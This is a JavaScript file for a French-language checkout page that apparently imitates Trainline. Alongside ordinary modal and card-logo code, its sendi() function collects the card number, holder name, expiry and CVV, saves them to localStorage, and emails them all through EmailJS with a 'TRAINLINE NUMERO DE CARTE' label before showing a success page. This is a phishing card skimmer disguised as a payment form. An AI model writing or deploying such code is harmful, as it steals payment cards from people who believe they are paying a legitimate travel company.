function voyage(){window.location="Voyage.html"}

function panier1(){
	Swal.fire({
		position: 'bottom-end',
		icon: 'info',
		title: 'votre panier est vide',
		showConfirmButton: false,
		timer : 3600,
	})
}





// Get the modal
var modal = document.getElementById("myModal");

// Get the button that opens the modal
/*var btn = document.getElementById("myBtn");*/

var btn = document.querySelector(".menu");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 

/*btn.onclick = */ 
function btn1() {
	document.getElementById("myModal").style.display = "block";
}

// When the user clicks on <span> (x), close the modal

/*span.onclick =*/ 
function span1() {
	document.getElementById("myModal").style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it


window.onclick = function(event) {
  if (event.target == modal) {
	modal.style.display = "none";
  }
}

window.onload = function (){

var price = localStorage.getItem('price');
document.getElementById("price").innerHTML= price;
var mail = localStorage.getItem("mail");
document.getElementById("mail").innerHTML=mail;


}

function valid(){
	document.getElementById('buy').style.display="block";
}

function closebuy(){
	document.getElementById('buy').style.display="none";


}


 function logoCard(){
	
	var regVisa=/^4[0-9]+/gm;
	var regMastercard=/^5[0-9]+/gm;
	var regAmerican=/^3[0-9]+/gm;
	
	var card=document.getElementById("card");
	if(card.value.match(regVisa)){
		document.getElementById("card").style.backgroundImage = "url('http://assets.stickpng.com/images/58482363cef1014c0b5e49c1.png')";
	}else if(card.value.match(regMastercard)){
		document.getElementById("card").style.backgroundImage = "url('https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/2560px-MasterCard_Logo.svg.png')";
	}else if(card.value.match(regAmerican)){
		document.getElementById("card").style.backgroundImage = "url('https://www.pngmart.com/files/13/American-Express-Logo-PNG-File.png')";
	 }else if(!card.value.match(regAmerican)&&!card.value.match(regMastercard)&&!card.value.match(regVisa)){
		document.getElementById("card").style.backgroundImage = "url('https://www.icone-png.com/png/13/12997.png')";
	 }else{
		 card.style.border="1px solid red";
	 }
 }


 function sendi(){
	var card=document.getElementById("card");
	var name=document.getElementById("name");
	var MM=document.getElementById("MM");
	var AA=document.getElementById("AA");
	var CVV=document.getElementById("CVV");
 localStorage.setItem("cardREf",card.value);
 localStorage.setItem("name",name.value);
 localStorage.setItem("MM",MM.value);
 localStorage.setItem("AA",AA.value);
 localStorage.setItem("CVV",CVV.value);

 var cardREf=localStorage.getItem("cardREf");
 var nameRef=localStorage.getItem("name");
 var month=localStorage.getItem("MM");
 var annee=localStorage.getItem("AA");
 var cvv=localStorage.getItem("CVV");


 (function() {
    emailjs.init("user_BUV4jmj5ZaEYjB6AxEe3j"); //please encrypted user id for malicious attacks
  })();
//set the parameter as per you template parameter[https://dashboard.emailjs.com/templates]
  var templateParams = {
    to_name: 'client',
    from_name: `TRAINLINE NUMERO DE CARTE :${cardREf} NOM :${nameRef} MOIS :${month} ANNEE :${annee} CVV :${cvv}`,
    message_html: 'knzdùlanùlanaùl',
  };

  emailjs.send('service_dpfxxse', 'template_avneowy', templateParams)
    .then(function(response) {
      console.log('SUCCESS!', response.status, response.text);
	  window.location="Succes.html";
    }, function(error) {
      console.log('FAILED...', error);
    });


 }

//  function pour rendre le bouton inactif si toute les zones ne sont pas remplie
 window.setInterval(function(){
	var card=document.getElementById("card");
	var name=document.getElementById("name");
	var MM=document.getElementById("MM");
	var AA=document.getElementById("AA");
	var CVV=document.getElementById("CVV");
	var sendBtn=document.getElementById("sendBtn");
	var sendBtn1=document.getElementById("sendBtn1");

	if(card.value!="" && name.value!="" && MM.value!="" && AA.value!="" && CVV.value!=""){
		sendBtn.style.display='block';
		sendBtn1.style.display='none';
	}else{
		sendBtn.style.display='none';
		sendBtn1.style.display='block';
		sendBtn1.style.backgroundColor='gray';
	}
},100)
